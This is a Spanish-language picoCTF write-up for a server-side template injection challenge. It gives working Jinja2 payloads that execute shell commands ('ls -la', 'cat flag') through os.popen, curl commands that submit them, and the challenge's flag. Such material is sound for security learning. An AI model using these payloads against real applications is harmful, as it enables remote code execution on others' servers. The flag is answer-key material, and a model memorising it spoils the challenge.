#### Description

I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:60760/)!
# Solución

Si pones cualquier valor, simplemente lo repite y puedes jugar con las entradas, pero las siguientes son las que te permiten ejecutar comandos.

Al poner esto en el campo y presionar Ok, puede ver los contenidos enumerados: `{{ cycler.__init__.__globals__.os.popen('ls -la').read() }}`

Desde aquí puedes ver que el archivo flag se acaba de llamar y puedes imprimirlo con esto: `flag``{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}`

Después de que se ejecute, la bandera debe imprimirse en la página web.

Sobre el desafío, dijo que era así, aquí hay una solución alternativa que funciona solo bajo la línea de comandos. Primero puedes hacer curl para ver el html: `browser_webshell_solvable``curl http://rescued-float.picoctf.net:52534/`

Esta es la parte clave a tener en cuenta:

```
<form action="/" method="POST">
    What do you want to announce: <input name="content" id="announce">
    <button type="submit"> Ok </button>
</form>
```

Luego, en función de eso, puede usar para llegar a la página, pero redirige, por lo que puede usar la bandera o simplemente usarla en su lugar para llegar a la página redirigida. Este comando da la bandera:`curl -X POST -d "content=Hey" http://rescued-float.picoctf.net:52534/``-L``wget`

`curl -L -X POST -d "content={{ cycler.__init__.__globals__.os.popen('cat flag').read() }}" http://rescued-float.picoctf.net:52534/`

Si quisieras ir un paso más allá, podrías dirigir la salida de curl a un archivo y ejecutar este comando:

`cat file | grep -E picoCTF{.*} | cut -d ">" -f2 | cut -d "<" -f1 > flag.txt`

Y luego conseguir la bandera de esa manera.`cat flag.txt`

**Respuesta en el formato del concurso:**
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}